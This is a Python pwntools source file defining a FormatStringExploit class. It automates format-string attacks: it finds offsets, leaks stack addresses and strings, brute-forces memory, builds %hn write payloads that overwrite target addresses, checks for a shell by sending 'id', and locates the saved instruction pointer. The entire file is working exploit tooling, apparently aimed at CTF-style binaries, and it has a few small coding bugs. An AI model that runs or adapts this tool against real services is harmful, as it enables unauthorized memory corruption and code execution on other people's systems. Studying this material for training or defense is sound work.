# x86
# Overwrite the address of the var `overwrite` with the address of `wanted`
import os
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))

from pwn import *
from time import sleep
from tools.pattern_tools import extract_tokens
from dispatcher import Dispatcher
from printer import print_colored


class FormatStringExploit:
    
    ### INITIALIZATION METHODS ###
    # region

    def __init__(self, config: dict[str, str | bool | int], dispatcher: Dispatcher):
        """
        Initialize the FormatStringExploit class.
        By default, the architecture is x86. To use x86_64, set the "arch" key in the config dictionary to "x86_64".
        :param config: Configuration dictionary
        :param dispatcher: Dispatcher object to handle communication with the target
        :return: None
        """
        self.config = config
        self.dispatcher = dispatcher

        ## Config parsing ##

        self.verbose = config.get("verbose", False)
        self.x86 = config.get("arch", "x86") == "x86"
        self.process_interactive = config.get("process_interactive", None)

        # Variables will be set during the exploit process
        self.offset, self.stack_alignment = None, None
        
    def update_offset_and_stack_alignment(self, offset, stack_alignment):
        """
        Update the offset and stack alignment for the exploit.
        :param offset: The offset to use in the format string exploit
        :param stack_alignment: The stack alignment to use in the exploit
        :return: None
        """
        self.offset = offset
        self.stack_alignment = stack_alignment
        if self.verbose:
            print_colored(f"Offset updated to {self.offset}, Stack alignment updated to {self.stack_alignment}", 'yellow')
    # endregion

    ### FIND OFFSET AND STACK ALIGNMENT METHODS ###
    # region
    
    def find_offset(self, max_offset=100, delay_between_request=0, connect_and_close=False, retry_on_error=True):
        """
        Find the offset for the format string exploit.        :param max_offset: Maximum offset to try
        :param connect_and_close: Whether to connect and close the dispatcher for each offset
        :param retry_on_error: Whether to retry on error
        :return: The offset and the stack alignment if found, otherwise None
        """
        for i in range(1, max_offset + 1):
            try:
                # Attempt to connect to the target service
                if connect_and_close or not self.process_interactive:
                    self.dispatcher.connect()
                else:
                    if not self.dispatcher.is_connected() and self.process_interactive:
                        print_colored("You must connect before sending commands or enable connect_and_close.", 'red')
                        return None, None

                # Craft the string bug command
                # The command is designed to trigger a format string vulnerability
                command = b"AAAA" + b"%" + bytes(str(i), 'utf-8') + b"$x"

                # Send the command and receive the response
                self.dispatcher.send_command(command)
                response = self.dispatcher.receive_response()

                if self.verbose:
                    print_colored(f"Response for offset {i}: {response}", 'yellow')

                # Close the connection if specified
                if connect_and_close or not self.process_interactive:
                    self.dispatcher.close()

                # Check if the response contains the address we are looking for
                if b"41414141" in response:
                    if self.verbose:
                        print_colored(f"[+] Found offset: {i}", 'green')
                    self.offset = i
                    self.stack_alignment = 0
                    return i, 0
                # Check for non-aligned addresses
                if b"41" in response:
                    stack_alignment = self.find_none_aligned_offset(i)
                    if stack_alignment is not None:
                        if self.verbose:
                            print_colored(f"[+] Found non-aligned offset: {i} with stack alignment: {stack_alignment}", 'green')
                        self.offset = i
                        self.stack_alignment = stack_alignment
                        return self.offset, stack_alignment
                    
            except Exception as e:
                if self.verbose:
                    print_colored(f"Error finding offset {i}: {e}", 'red')
                if not retry_on_error:
                    break
            if delay_between_request > 0:
                sleep(delay_between_request)
        return None, None
    
    def find_none_aligned_offset(self, offset):
        """Find the offset for the format string exploit with non-aligned addresses."""
        range_offset = 4 if self.x86 else 8
        for i in range(1, range_offset):
            try:
                # Attempt to connect to the target service
                self.dispatcher.connect()
                command = b"4" * (4 + i) + b"%" + bytes(str(offset), 'utf-8') + b"$x"
                self.dispatcher.send_command(command)
                response = self.dispatcher.receive_response()

                if self.verbose:
                    print_colored(f"Response for offset {offset + i}: {response}", 'yellow')

                # Close the connection
                if not self.process_interactive:
                    self.dispatcher.close()
                if b"41414141" in response:
                    if self.verbose:
                        print_colored(f"[+] Found non-aligned offset: {offset + i}", 'green')
                    return i
            except Exception as e:
                if self.verbose:
                    print_colored(f"Error finding non-aligned offset {offset + i}: {e}", 'red')
        return None
    # endregion

    ### PAYLOAD GENERATION METHODS ###
    # region

    def split_address(self, address):
        """Split an address into high and low 16 bits."""
        high = (address >> 16) & 0xFFFF
        low = address & 0xFFFF
        if high > low:
            if self.verbose:
                print_colored(f"High 16 bits: {high:#06x}, Low 16 bits: {low:#06x}", 'yellow')
            return high, low, False
        else:
            if self.verbose:
                print_colored(f"High 16 bits: {low:#06x}, Low 16 bits: {high:#06x} (swapped)", 'yellow')
            return low, high, True
        
    def return_payload(self, address_overwrite, address_wanted):
        """
        Generate the payload to overwrite an address with a specific value.
        :param address_overwrite: The address to overwrite
        :param address_wanted: The address to write to
        :return: The payload to send to the target service
        """

        if self.offset is None:
            raise ValueError("Offset not set. Call find_offset() first.")
        
        if self.verbose:
            print(f"Using offset: {self.offset}, Stack alignment: {self.stack_alignment}")
        
        # Split the address into high and low 16 bits
        high_16, low_16, swapped = self.split_address(address_wanted)

        first_offset = bytes(str(low_16 - self.stack_alignment - 8), 'utf-8')
        second_offset = bytes(str(high_16 - low_16), 'utf-8')
        # Add stack alignment
        payload = b"\x90" * self.stack_alignment

        # Add the address to overwrite
        payload += p32(address_overwrite)
        # Add the second address to overwrite
        payload += p32(address_overwrite + 0x2)

        # Contruct the format string payload
        payload += b"%" + first_offset + b"c"
        if swapped:
            payload += b'%' + bytes(str(self.offset + 1), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(self.offset), 'utf-8') + b'$hn'
        payload += b"%" + second_offset + b"c"
        if swapped:
            payload += b'%' + bytes(str(self.offset), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(self.offset + 1), 'utf-8') + b'$hn'
        if self.verbose:
            print_colored(f"Payload length: {len(payload)}", 'cyan')
            print_colored(payload, 'cyan')
        return payload
    # endregion

    ### STACK METHODS ###
    # region

    def return_stack_addresses(self, filter_addresses=None, max_length=100, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Return all addresses between range in filter_addresses.
        :param filter_addresses: List of tuples (address_low, address_sup) to filter addresses. If this is None, all addresses will be returned.
        :param max_length: Maximum length of the stack to search for addresses
        :return: List of tuples (offset, address) where offset is the offset in the format string and address is the address found in the stack
        """

        addresses = []
        if filter_addresses is None:
            filter_addresses = []

        # Main loop to find addresses in the stack
        for i in range(1, max_length + 1):
            # Attempt to connect to the target service
            if connect_and_close or not self.process_interactive:
                self.dispatcher.connect()
    
            # Craft the command to send
            command = b"%" + bytes(str(i), 'utf-8') + b"$p"

            # Send the command and receive the response
            self.dispatcher.send_command(command)
            try:
                response = self.dispatcher.receive_response()
            except Exception as e:
                if self.verbose:
                    print_colored(f"Error receiving response for offset {i}: {e}", 'red')
                if not retry_on_error:
                    if connect_and_close or not self.process_interactive:
                        self.dispatcher.close()
                    break
                if connect_and_close or not self.process_interactive:
                    self.dispatcher.close()
                continue

            if self.verbose:
                print_colored(f"Extracted address: {response}", 'yellow')

            if response == b"" or response == b"(nil)" or response == '(null)' or response is None:
                # Close the connection if specified
                if connect_and_close or not self.process_interactive:
                    self.dispatcher.close()
                continue  # Skip empty responses

            # Add all addresses if no filter is provided
            if len(filter_addresses) == 0:
                try:
                    addresses.append((i, hex(int(response, 16))))
                except ValueError:
                    print_colored(f"Try to use a pattern to extract the address from the response (setup_address_pattern()): {response}", 'red')
            # Check if the response is valid
            for address_low, address_sup in filter_addresses:
                
                int_address_response = int(response, 16)
                    
                # Check if the address is within the specified range
                if address_low <= int_address_response <= address_sup:
                    if self.verbose:
                        print_colored(f"Found address: {int_address_response:#x} for offset {i}", 'green')

                    # Check if the address is not already in the list
                    if not any(int_address_response == addr[1] for addr in addresses):
                        addresses.append((i, hex(int_address_response)))
                        if self.verbose:
                            print_colored(f"Added address: {int_address_response:#x} for offset {i}", 'green')
                        break
            # Delay between requests if specified
            if delay_between_request > 0:
                sleep(delay_between_request)
            
            # Close the connection if specified
            if connect_and_close or not self.process_interactive:
                self.dispatcher.close()

            if self.verbose:
                print_colored(f"Response for offset {i}: {response}", 'yellow')
        if self.verbose:
            print_colored(f"Found {len(addresses)} addresses in the stack.", 'green')
        return addresses

    def print_stack_strings(self, print_ascii=False, max_length=1000, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Print the strings found in the stack.
        :return: None
        """

        # Main loop to find addresses in the stack
        for i in range(1, max_length + 1):
            # Attempt to connect to the target service
            if connect_and_close or not self.process_interactive:
                self.dispatcher.connect()
    
            if print_ascii:
                # Craft the command to send for printing ASCII strings
                command = b"%" + bytes(str(i), 'utf-8') + b"$s"
            else:
                # Craft the command to send for printing hexadecimal addresses
                command = b"%" + bytes(str(i), 'utf-8') + b"$p"

            # Send the command and receive the response
            self.dispatcher.send_command(command)
            try:
                response = self.dispatcher.receive_response()
            except Exception as e:
                if self.verbose:
                    print_colored(f"Error receiving response for offset {i}: {e}", 'red')
                if not retry_on_error:
                    if connect_and_close or not self.process_interactive:
                        self.dispatcher.close()
                    break
                if connect_and_close or not self.process_interactive:
                    self.dispatcher.close()
                continue
            if self.verbose:
                print_colored(f"Extracted address: {response}", 'yellow')

            if response == b"" or response == b"(nil)" or response == b'(null)' or response is None:
                # Close the connection if specified
                if connect_and_close or not self.process_interactive:
                    self.dispatcher.close()
                    
                continue  # Skip empty responses

            # Print the response as a string
            try:
                response_str = response.decode('utf-8', errors='ignore')
                print_colored(f"Offset {i}: {response_str}", 'cyan')
            except UnicodeDecodeError:
                print_colored(f"Offset {i}: Non-decodable response: {response}", 'red')

            # Delay between requests if specified
            if delay_between_request > 0:
                sleep(delay_between_request)

            # Close the connection if specified
            if connect_and_close or not self.process_interactive:
                self.dispatcher.close()

            if self.verbose:
                print_colored(f"Response for offset {i}: {response}", 'yellow')


    def find_pattern_in_stack(self, pattern_to_find, max_length=1000, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Find a specific pattern in the stack.
        :param pattern_to_find: The pattern to find in the stack
        :param max_length: Maximum length of the stack to search for addresses
        :return: List of tuples (offset, address) where offset is the offset in the format string and address is the address found in the stack
        """
        addresses = self.return_stack_addresses(
            filter_addresses=None,
            max_length=max_length,
            delay_between_request=delay_between_request,
            connect_and_close=connect_and_close,
            retry_on_error=retry_on_error
        )
        
        found_addresses = []

        pattern = re.compile(pattern_to_find)

        # Main loop to find addresses in the stack
        for i in range(1, max_length + 1):
            # Attempt to connect to the target service
            if connect_and_close or not self.process_interactive:
                self.dispatcher.connect()
    
            
            # Craft the command to send for printing ASCII strings
            command = b"%" + bytes(str(i), 'utf-8') + b"$s"

            # Send the command and receive the response
            self.dispatcher.send_command(command)
            try:
                response = self.dispatcher.receive_response()
            except Exception as e:
                if self.verbose:
                    print_colored(f"Error receiving response for offset {i}: {e}", 'red')
                if not retry_on_error:
                    if connect_and_close or not self.process_interactive:
                        self.dispatcher.close()
                    break
                if connect_and_close or not self.process_interactive:
                    self.dispatcher.close()
                continue
            if self.verbose:
                print_colored(f"Extracted address: {response}", 'yellow')

            if response == b"" or response == b"(nil)" or response == b'(null)' or response is None:
                # Close the connection if specified
                if connect_and_close or not self.process_interactive:
                    self.dispatcher.close()
                
                continue  # Skip empty responses

            # Print the response as a string
            try:
                if pattern.search(response.decode('utf-8', errors='ignore')):
                    response_str = response.decode('utf-8', errors='ignore')
                    if self.verbose:
                        print_colored(f"Offset {i}: {response_str}", 'cyan')
                    
                    for offset, address in addresses:
                        if offset == i:
                            found_addresses.append((address, response_str))
                else:
                    if self.verbose:
                        print_colored(f"Offset {i}: Pattern '{pattern_to_find}' not found in response: {response}", 'red')
            except UnicodeDecodeError:
                print_colored(f"Offset {i}: Non-decodable response: {response}", 'red')

            # Delay between requests if specified
            if delay_between_request > 0:
                sleep(delay_between_request)

            # Close the connection if specified
            if connect_and_close or not self.process_interactive:
                self.dispatcher.close()

            if self.verbose:
                print_colored(f"Response for offset {i}: {response}", 'yellow')

        if self.verbose:
            print_colored(f"Found {len(found_addresses)} addresses containing the pattern '{pattern_to_find}' in the stack.", 'green')

        return found_addresses

    def brute_force_find_pattern(self, pattern_to_find, starting_address=0xbfff0000, end_address=0xbfffffff, increment=0x2, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Find a specific pattern in a current address range.
        :param pattern_to_find: The pattern to find
        :param starting_address: The starting address to begin the search
        :return: address where the pattern is found or None if not found
        """
        if self.offset is None:
            raise ValueError("Offset not set. Call find_offset() first.")
        
        if self.verbose:
            print_colored(f"Using offset: {self.offset}, Stack alignment: {self.stack_alignment}", 'yellow')

        pattern = re.compile(pattern_to_find)

        # Main loop to find addresses
        while starting_address < end_address:
            # Attempt to connect to the target service
            if connect_and_close or not self.process_interactive:
                self.dispatcher.connect()
    
            
            # Craft the command to send for printing ASCII strings
            if self.x86:
                command = b"A" * self.stack_alignment + p32(starting_address) + b"%" + bytes(str(self.offset)) + b"$s"
            else:
                command = b"A" * self.stack_alignment + p64(starting_address) + b"%" + bytes(str(self.offset)) + b"$s"

            # Send the command and receive the response
            self.dispatcher.send_command(command)
            try:
                response = self.dispatcher.receive_response()
            except Exception as e:
                if self.verbose:
                    print_colored(f"Error receiving response for address {starting_address:#x}: {e}", 'red')
                if not retry_on_error:
                    if connect_and_close or not self.process_interactive:
                        self.dispatcher.close()
                    break
                starting_address += increment
                if connect_and_close or not self.process_interactive:
                    self.dispatcher.close()
                continue

            if response == b"" or response == b"(nil)" or response == b'(null)' or response is None:
                # Close the connection if specified
                if connect_and_close or not self.process_interactive:
                    self.dispatcher.close()
                starting_address += increment
                if self.connect_and_close or not self.process_interactive:
                    self.dispatcher.close()
                continue  # Skip empty responses

            # Print the response as a string
            try:
                if pattern.search(response.decode('utf-8', errors='ignore')):
                    response_str = response.decode('utf-8', errors='ignore')
                    if self.verbose:
                        print_colored(f"Found pattern '{pattern_to_find}' at address {starting_address:#x}: {response_str}", 'cyan')
                    if connect_and_close or not self.process_interactive:
                        self.dispatcher.close()
                    return starting_address
                else:
                    if self.verbose:
                        print_colored(f"Address {starting_address:#x}: Pattern '{pattern_to_find}' not found in response: {response}", 'red')
            except UnicodeDecodeError:
                print_colored(f"Address {starting_address:#x}: Non-decodable response: {response}", 'red')

            # Delay between requests if specified
            if delay_between_request > 0:
                sleep(delay_between_request)

            # Close the connection if specified
            if connect_and_close or not self.process_interactive:
                self.dispatcher.close()

            starting_address += increment

        if self.verbose:
            print_colored(f"String '{string_to_find}' not found in the address range {starting_address:#x} to {end_address:#x}.", 'red')
        return None
    
    # endregion

    ## EXPLOIT METHODS ##
    # region

    def classic_exploit(self, address_overwrite, address_wanted, win_str, interactive=False):
        """
        Perform the classic format string exploit.
        :param address_overwrite: The address to overwrite
        :param address_wanted: The address to write to
        :param win_str: The string before send `id` command to check if the exploit was successful
        :param interactive: Whether to start an interactive session after the exploit
        :return: The response from the target service if not interactive, otherwise None
        """
        if self.offset is None:
            raise ValueError("Offset not set. Call find_offset() first.")
        
        if self.verbose:
            print_colored(f"Using offset: {self.offset}, Stack alignment: {self.stack_alignment}", 'yellow')

        self.dispatcher.connect()

        # Generate the payload to overwrite the address
        payload = self.return_payload(address_overwrite, address_wanted)

        # Send the payload to the target service
        self.dispatcher.send_command(payload, get_return=False)

        if interactive:
            # Start an interactive session with the target service
            self.dispatcher.interactive()
            self.dispatcher.close()
        else:
            self.dispatcher.receive_response(win_str)
            self.dispatcher.client.p.send(b"id\nexit\n")
            response = self.dispatcher.receive_response(disable_template=True)
            if self.verbose:
                print_colored(f"Response after exploit (execute `id`): {response}", 'yellow')
            self.dispatcher.close()
            return response

        if self.verbose:
            print_colored(f"Payload sent: {payload}", 'yellow')

        return None
    #endregion

    #region FIND INSTRUCTION POINTER METHODS

    def find_instruction_pointer_in_stack(self, addresses = [], max_length=100, delay_between_request=0.1, connect_and_close=False, retry_on_error=True):
        """
        Find a way to control the instruction pointer in the stack.
        Useful if the ASLR is disabled or if the program is in an infinite loop.
        :param addresses: List of tuples (offset, address) where offset is the offset in the format string and address is the address found in the stack
        :param max_length: Maximum length of the stack to search for addresses
        :param delay_between_request: Delay between requests in seconds
        :param connect_and_close: Whether to connect and close the dispatcher for each request
        :param retry_on_error: Whether to retry on error
        :return: The address of the instruction pointer if found, otherwise None
        """
        if self.dispatcher.aslr_enabled() and not self.dispatcher.is_infinite_loop():
            print_colored("[-] ASLR is enabled and the program is not in an infinite loop. Cannot find instruction pointer.", 'red')
            return None
        # Common values for instruction pointers
        if self.x86:
            filter_addresses = [(0xbff000000, 0xffffffff)]  # x86 typical stack range
        else:
            filter_addresses = [(0x7ff000000000, 0x7fffffffffff)]  # x86_64 typical stack range
        if len(addresses) == 0:

            if self.verbose:
                print_colored("[+] Finding all addresses in the stack...", 'yellow')

            # Get all addresses in the stack
            addresses = self.return_stack_addresses(
                filter_addresses=filter_addresses,
                max_length=max_length,
                delay_between_request=delay_between_request,
                connect_and_close=connect_and_close,
                retry_on_error=retry_on_error
            )
            if self.verbose:
                print_colored(f"[+] Found {len(addresses)} potential instruction pointer addresses in the stack.", 'yellow')
        else:
            for addr in addresses:
                if not (filter_addresses[0][0] <= int(addr[1], 16) <= filter_addresses[0][1]):
                    addresses.remove(addr)

        if len(addresses) == 0:
            if self.verbose:
                print_colored("[-] No instruction pointer found in the stack.", 'red')
            return None

        # Try for all addresses find to overwrite the address with `0xdeadbeef` and check if the program crashes and check if the instruction pointer is `0xdeadbeef`
        for offset, address in addresses:
            int_address = int(address, 16)
            if self.verbose:
                print_colored(f"[+] Trying to overwrite address {int_address:#x} at offset {offset} with 0xdeadbeef", 'yellow')

            self.dispatcher.connect()
            # Generate the payload to overwrite the address
            payload = self.return_payload(int_address, 0xdeadbeef)
            print_colored(f"Payload: {payload}", 'yellow')
            # Send the payload to the target service
            segfault_addr = self.dispatcher.get_segfault(payload)
            print_colored(f"Segfault address: {segfault_addr}", 'yellow')
            if segfault_addr == 0xdeadbeef:
                if self.verbose:
                    print_colored(f"[+] Found instruction pointer at address {int_address:#x} with offset {offset}", 'yellow')
                self.dispatcher.close()
                return int_address
            self.dispatcher.close()
    

    def find_instruction_pointer_bruteforce(self, range_address, step = 0x2):
        """
        Find the instruction pointer in the stack.
        Useful if the ASLR is disabled or if the program is in an infinite loop.
        :param range_address: Tuple (start_address, end_address) to brute force the instruction pointer address
        :param max_length: Maximum length of the stack to search for addresses
        :param delay_between_request: Delay between requests in seconds
        :param connect_and_close: Whether to connect and close the dispatcher for each request
        :param retry_on_error: Whether to retry on error
        :return: The address of the instruction pointer if found, otherwise None
        """
        if self.dispatcher.aslr_enabled() and not self.dispatcher.is_infinite_loop():
            print_colored("[-] ASLR is enabled and the program is not in an infinite loop. Cannot find instruction pointer.", 'red')
            return None
        # Try for all addresses find to overwrite the address with `0xdeadbeef` and check if the program crashes and check if the instruction pointer is `0xdeadbeef`
        for address in range(range_address[0], range_address[1], step):

            if self.verbose:
                print_colored(f"[+] Trying to overwrite address {address:#x} with 0xdeadbeef", 'yellow')

            self.dispatcher.connect()
            # Generate the payload to overwrite the address
            payload = self.return_payload(address, 0xdeadbeef)
            print_colored(f"Payload: {payload}", 'yellow')
            # Send the payload to the target service
            segfault_addr = self.dispatcher.get_segfault(payload)
            print_colored(f"Segfault address: {segfault_addr}", 'yellow')
            if segfault_addr == 0xdeadbeef:
                if self.verbose:
                    print_colored(f"[+] Found instruction pointer at address {address:#x}", 'yellow')
                self.dispatcher.close()
                return address
            self.dispatcher.close()
    # endregion